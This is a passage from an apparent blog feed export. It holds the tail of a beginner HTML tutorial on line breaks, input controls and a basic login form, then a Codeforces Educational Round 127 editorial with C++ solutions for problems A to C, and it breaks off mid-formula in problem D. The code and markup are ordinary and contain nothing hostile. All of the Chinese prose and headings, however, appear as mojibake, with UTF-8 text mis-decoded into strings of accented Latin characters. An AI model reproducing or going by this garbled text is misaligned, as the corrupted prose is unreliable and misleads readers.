class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            è¿™æ˜¯ç¬¬ä¸€è¡Œ</span><br><span class="line">            å¦‚æœæ²¡æœ‰åŠ bræ ‡ç­¾ï¼Œè¿™é‡Œè¿˜æ˜¯ç¬¬ä¸€è¡Œ<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">            å‰é¢åŠ äº†bræ ‡ç­¾ï¼Œå› æ­¤è¿™é‡Œå¼€å§‹æ˜¯ç¬¬äºŒè¡Œ</span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼Œè¿™ä¸ªdemoä¹Ÿæ˜¯å……åˆ†å±•ç°äº†ï¼Œä»£ç é‡Œæ¢è¡Œä»…ä»…åªæ˜¯ä¸ºäº†å¥½çœ‹ï¼ŒçœŸçš„è¦æ¢è¡Œè¿˜å¾—è¿™ä¸ªæ ‡ç­¾å‡ºé©¬ã€‚</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/11.png" alt="11"></p><p>åˆ°è¿™é‡Œï¼Œå¸¸ç”¨çš„æ ‡ç­¾å°±è®²å®Œäº†ã€‚</p><h3 id="inputæ ‡ç­¾"><a href="#inputæ ‡ç­¾" class="headerlink" title="inputæ ‡ç­¾"></a>inputæ ‡ç­¾</h3><p>è¿™ä¸ªå…¶å®ä¹Ÿç®—æ˜¯éå¸¸å¸¸è§çš„æ ‡ç­¾äº†ï¼Œåªä¸è¿‡å®ƒæœ‰ç‚¹å°å¤æ‚ï¼Œå› æ­¤å•ç‹¬æ‹å‡ºæ¥è®²è®²ã€‚</p><p>è¿™ä¸ªä¸»è¦ç”¨äºæ”¶é›†è¡¨å•ç”¨çš„æ§ä»¶ï¼Œä½¿ç”¨ <code>type</code> å±æ€§æŒ‡å®šå®ƒå…·ä½“æ˜¯å“ªä¸€ç±»æ§ä»¶ï¼Œè¿™äº›æ§ä»¶é€šå¸¸ä¼šåœ¨ <code>form</code> æ ‡ç­¾å†…ï¼ŒæŒ‡å®š <code>form</code> æ ‡ç­¾æäº¤æ–¹å¼ï¼Œå½“ç‚¹å‡»æäº¤æ—¶ä¾¿ä¼šå°†è¿™ä¸ª <code>form</code> æ ‡ç­¾ä¸Šæ‰€æœ‰çš„ç”¨æˆ·è¾“å…¥æäº¤åˆ°åç«¯å»ã€‚åªæ˜¯æˆ‘ä»¬æ²¡æœ‰åœ¨åç«¯å†™è„šæœ¬å“åº”è¿™äº›æ•°æ®ï¼Œå› æ­¤æˆ‘ä»¬è‡ªå·±å°è¯•çš„è¯ç‚¹å‡»é€šå¸¸æ˜¯æ— æ•ˆçš„ã€‚</p><p>å¸¸ç”¨çš„æ§ä»¶æœ‰ä»¥ä¸‹å‡ ç§</p><ul><li><code>text</code>ï¼šæ™®é€šæ–‡æœ¬æ¡†</li><li><code>password</code>ï¼šå¯†ç æ¡†ï¼Œä¸æ–‡æœ¬æ¡†ä¸€æ ·åªæ˜¯è¾“å…¥å†…å®¹ä¼šè¢«å’Œè°</li><li><code>textarea</code>ï¼šå¤šè¡Œæ–‡æœ¬æ¡†</li><li><code>submit</code>ï¼šæäº¤æŒ‰é’®</li><li><code>radio</code>ï¼šå•é€‰æ¡†</li><li><code>checkbox</code>ï¼šå¤é€‰æ¡†</li><li><code>select</code>ï¼šä¸‹æ‹‰æ¡†</li></ul><p>è¿™ä¸ªæˆ‘ä»¬ä¸ä¸€ä¸€è®²è§£äº†ï¼Œç›´æ¥ä¸€èµ·èšåˆèµ·æ¥è¯•è¯•å§ã€‚</p><p>æˆ‘ä»¬å¤åˆ»ä¸€ä¸ªæœ€åŸºæœ¬çš„ç™»å½•å‰ç«¯</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">                ç”¨æˆ·å<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">                å¯†ç <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">                èº«ä»½ï¼š<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;user&quot;</span>/&gt;</span>ç®¡ç†å‘˜</span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin&quot;</span>/&gt;</span>ç”¨æˆ·</span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;guest&quot;</span>&gt;</span>æ¸¸å®¢<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;login&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;keep&quot;</span> <span class="attr">value</span>=<span class="string">&quot;remember&quot;</span>&gt;</span>è®°ä½å¯†ç </span><br><span class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/12.png" alt="12"></p><p>å¯ä»¥å‘ç° <code>input</code> æ ‡ç­¾éƒ½è®¾ç½®äº†ä¸‰ä¸ªå€¼ï¼Œç¬¬ä¸€ä¸ªæˆ‘ä»¬è¯´è¿‡äº†æŒ‡å®šæ§ä»¶ç±»å‹ï¼Œç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªæ˜¯ä»€ä¹ˆå‘¢ã€‚</p><p><code>name</code>å…¶å®å°±æ˜¯å‚æ•°åï¼Œè¿™ä¸ª<code>value</code>å‘¢å°±æ˜¯å‚æ•°å€¼äº†ï¼Œ<code>form</code> æ ‡ç­¾æœ‰ä¸€ä¸ªå±æ€§æŒ‡å®šçš„æ˜¯æäº¤è¡¨å•çš„æ–¹å¼ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šé»˜è®¤ä»¥ <code>get</code> æ–¹å¼æäº¤ï¼Œ<code>get</code> æ–¹å¼æˆ‘ä»¬å¾ˆæ¸…æ¥šä¸€ç‚¹å°±æ˜¯æ•°æ®åœ¨ <code>url</code> ä¸­éƒ½æ˜¯å¯ä»¥çœ‹åˆ°çš„çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬éšä¾¿è¾“å…¥ç‚¹å‡»æäº¤çœ‹çœ‹ä¼šå‘ç”Ÿä»€ä¹ˆã€‚</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/13.png" alt="13"></p><p>ä» <code>url</code> ä¸­ä¹Ÿèƒ½å¾ˆæ¸…æ¥šçš„çœ‹åˆ°åˆšåˆšè¯´çš„è¿™ä¸€ç‚¹ï¼Œåªæ˜¯è¿™ç§æäº¤æ–¹å¼å·²ç»å¾ˆå°‘è§äº†ï¼Œå¤§å®¶ä¹Ÿèƒ½çœ‹åˆ°ï¼Œè¾“å…¥çš„æ•°æ®åŸºæœ¬å°±æ˜¯æ˜æ–‡ä¼ è¾“çš„ï¼Œç°åœ¨ç½‘ç»œå®‰å…¨ä¹Ÿæ˜¯å›½å®¶é«˜åº¦é‡è§†çš„ï¼Œç¨å¾®å¤§ä¸€ç‚¹çš„ç½‘ç«™åŸºæœ¬éƒ½æ˜¯è‡ªå·±å†™æäº¤æ–¹æ³•ç„¶åç„¶å <code>js</code> ç»‘å®šæ§ä»¶å»æ‰§è¡Œäº‹ä»¶ï¼Œè¿™æ ·å°±èƒ½åœ¨ <code>js</code> é‡Œå†™åŠ è§£å¯†æ–¹æ³•äº†ã€‚</p><p>å°±è¿™ä¹ˆå¤šå§ï¼Œhtmlå­¦åˆ°è¿™é‡Œå·®ä¸å¤šèƒ½å¼„æ¸…æ¥šä¸€ç‚¹äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
          <category> html </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>educational codeforces round 127(Div.2)</title>
      <link href="/2022/04/23/Educational%20Codeforces%20Round%20127(Div.2)/"/>
      <url>/2022/04/23/Educational%20Codeforces%20Round%20127(Div.2)/</url>
      
        <content type="html"><![CDATA[<p><a href="https://codeforces.com/contest/1671">Educational Codeforces Round 127 (Rated for Div. 2)</a>ï¼Œå’•äº†æœ‰ç‚¹ä¹…äº†ï¼Œç°åœ¨å¼€å†™é¢˜è§£ã€‚</p><span id="more"></span><h2 id="A-String-Building"><a href="#A-String-Building" class="headerlink" title="A. String Building"></a>A. String Building</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/04/23/Educational%20Codeforces%20Round%20127(Div.2)/1.png" alt="1"></p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>åˆ†æå­—ç¬¦ä¸²æ˜¯å¦èƒ½ç”±aa,aaa,bb,bbbç»„æˆï¼Œç»™å®šå­—ç¬¦ä¸²åªå«æœ‰aå’Œbï¼Œå¾ˆç®€å•ï¼Œå°±çœ‹çœ‹æœ‰æ²¡æœ‰å•ç‹¬å­˜åœ¨çš„aæˆ–è€…bå³å¯</p><h3 id="æ ‡ç¨‹"><a href="#æ ‡ç¨‹" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">100005</span>]; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(len==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    s[len++]=<span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==s[i<span class="number">-1</span>])&#123;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(ans==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">            ans=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Consecutive-Points-Segment"><a href="#B-Consecutive-Points-Segment" class="headerlink" title="B. Consecutive Points Segment"></a>B. Consecutive Points Segment</h2><h3 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/04/23/Educational%20Codeforces%20Round%20127(Div.2)/2.png" alt="2"></p><h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>åœ¨æ•°è½´ä¸Šæ”¾è‹¥å¹²ä¸ªç‚¹ï¼Œæ¯ä¸ªç‚¹å¯ä»¥å·¦ç§»æˆ–è€…å³ç§»ä¸€ä¸ªå•ä½ï¼Œæˆ–è€…ä¸ç§»ï¼Œåˆ¤æ–­æœ€åæ‰€æœ‰ç‚¹èƒ½å¦åœ¨æ•´æ•°é›†åˆå†…è¿ç»­ã€‚åªè€ƒè™‘æœ€å·¦è¾¹å’Œæœ€å³è¾¹çš„ç‚¹ï¼Œä¸éš¾å‘ç°ï¼Œè‹¥èƒ½è¿ç»­ï¼Œåˆ™æ»¡è¶³a[n]-a[1]=n-1ï¼Œæˆ‘ä»¬å°±çœ‹æœ€å¤–ä¸¤ä¸ªç‚¹èƒ½å¦è¾¾åˆ°è¿™ä¸ªçº¦æŸã€‚è‹¥å·¦è¾¹ç‚¹å³ç§»ï¼Œå³è¾¹ç‚¹å·¦ç§»åˆ™å¯ä»¥ä½¿å¾—é—´è·ç¼©å°2ï¼Œå› æ­¤è‹¥åŸæœ¬è·ç¦»è¶…è¿‡äº†n+1åˆ™ä¸€å®šä¸è¡Œã€‚</p><h3 id="æ ‡ç¨‹-1"><a href="#æ ‡ç¨‹-1" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">200005</span>]; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;%d %d\n&quot;,a[n]-a[1],n);</span></span><br><span class="line">    <span class="keyword">if</span>(a[n]-a[<span class="number">1</span>]&gt;n+<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Dolce-Vita"><a href="#C-Dolce-Vita" class="headerlink" title="C. Dolce Vita"></a>C. Dolce Vita</h2><h3 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/04/23/Educational%20Codeforces%20Round%20127(Div.2)/3.png" alt="3"></p><h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿™é¢˜å¾ˆæœ‰æ„æ€ã€‚ç»™ä½ nä¸ªå•†åº—å’Œæ¯å¤© $k$ æšé‡‘å¸ï¼Œæ¯ä¸ªå•†åº—åªæ¯å¤©å–ä¸€ä¸ªç³–æœåŒ…ï¼Œæ¯å¤©æ¶¨ä»·ä¸€å—ã€‚é—®ç»è¿‡å¾ˆå¤šå¤©åä½ æœ€å¤šèƒ½ä¹°åˆ°å¤šå°‘ï¼Œå¹¶ä¸”å®ƒå‘Šè¯‰ä½ äº†æœ€åä¸€å®šæœ‰ä¸€å¤©ä½ ä¸€ä¸ªç³–æœåŒ…ä¹Ÿä¹°ä¸äº†ã€‚</p><p>é¦–å…ˆä¸éš¾å¾—å‡ºï¼Œæˆ‘è‚¯å®šè¦ä»æœ€å°çš„ç³–æœå¼€å§‹ä¹°ä¹°åˆ°ä¸èƒ½ä¹°ä¸ºæ­¢æ‰æ˜¯æœ€ä¼˜çš„è§£ã€‚å› æ­¤å…ˆæ’ä¸ªåºè‚¯å®šæ²¡é”™ï¼Œç„¶åæ±‚å‡ºå‰ç¼€å’Œ $sum[i]$è¡¨ç¤ºä¹° $i$ ä¸ªç³–æœçš„æœ€å°èŠ±è´¹ã€‚è¿™é‡Œå› ä¸ºå¤©æ•°ä¸ç¡®å®šå¾ˆå¯èƒ½è¦è¿‡è¶…è¿‡ $10^9$ å¤©ï¼Œå› æ­¤æˆ‘ä»¬ä¸èƒ½ä»å¤©æ•°ä¸Šå¾ªç¯ï¼Œæˆ‘ä»¬å°±æ¨ä»èƒ½ä¹° $i$ ä¸ªç‰©å“åˆ° $i-1$ ä¸ªç‰©å“è¿‡äº†å¤šå°‘å¤©ï¼Œå‡è®¾è¿‡äº† $q$ å¤©ï¼Œé‚£ä¹ˆè¿™å‡ å¤©çš„æ”¶ç›Šå°±æ˜¯ $q*i$ã€‚</p><p>é‚£ä¹ˆå‡è®¾ä»Šå¤©æ˜¯xå¤©ï¼Œæˆ‘èƒ½ä¹°jä»¶ç‰©å“ï¼Œæˆ‘ä»¬èƒ½æŒç»­ä¹°jä»¶ç‰©å“çš„å¤©æ•°å°±æ˜¯ $ceil((double)(x-sum[j])/j-i)+!((x-sum[j])%j)$ã€‚æ¨å‡ºè¡¨è¾¾å¼ä¹‹åå…¶å®æ•´ä¸ªç¨‹åºä¹Ÿå°±ä¸éš¾å†™äº†ï¼Œå…ˆäºŒåˆ†å‡ºç¬¬0å¤©çš„ä½ç½®ç„¶åå¾€å‰ä¸€ä»¶ä¸€ä»¶æ•°å³å¯ï¼Œæœ€åä¸è¦å¿˜äº†å¼€ $long\ long$ï¼Œå¯æ¶ï¼Œæ²¡å‡†æˆ‘å¼€äº†å°±è“åäº†ã€‚</p><h3 id="æ ‡ç¨‹-2"><a href="#æ ‡ç¨‹-2" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">200005</span>];</span><br><span class="line"><span class="keyword">int</span> sum[<span class="number">200005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,x;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;x;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">1</span>+n);</span><br><span class="line">    sum[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        sum[i]=sum[i<span class="number">-1</span>]+a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="built_in">upper_bound</span>(sum,sum+<span class="number">1</span>+n,x)-sum<span class="number">-1</span>;</span><br><span class="line">    <span class="comment">//printf(&quot;I can choose %d pack\n&quot;,cnt);</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=cnt;j&gt;=<span class="number">1</span>;j--)&#123;</span><br><span class="line">        <span class="comment">//printf(&quot;today is %d-th day\n&quot;,i);</span></span><br><span class="line">        <span class="keyword">int</span> after= <span class="built_in">ceil</span>((<span class="keyword">double</span>)(x-sum[j])/j-i)+!((x-sum[j])%j);</span><br><span class="line">        i+=after;</span><br><span class="line">        <span class="comment">//printf(&quot;I can buy until %d\n&quot;,i);</span></span><br><span class="line">        ans+=j*after;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-Insert-a-Progression"><a href="#D-Insert-a-Progression" class="headerlink" title="D. Insert a Progression"></a>D. Insert a Progression</h2><h3 id="é¢˜ç›®æè¿°-3"><a href="#é¢˜ç›®æè¿°-3" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/04/23/Educational%20Codeforces%20Round%20127(Div.2)/4.png" alt="4"></p><h3 id="é¢˜ç›®åˆ†æ-3"><a href="#é¢˜ç›®åˆ†æ-3" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>åœ¨æ•°åˆ—ä¸­æ’å…¥xä¸ªæ•°ï¼Œä½¿å¾— $\sum <em>{i=1}^{n+x-1}|a_i^{â€˜}-a</em>{i-1}^{â€˜}|$ 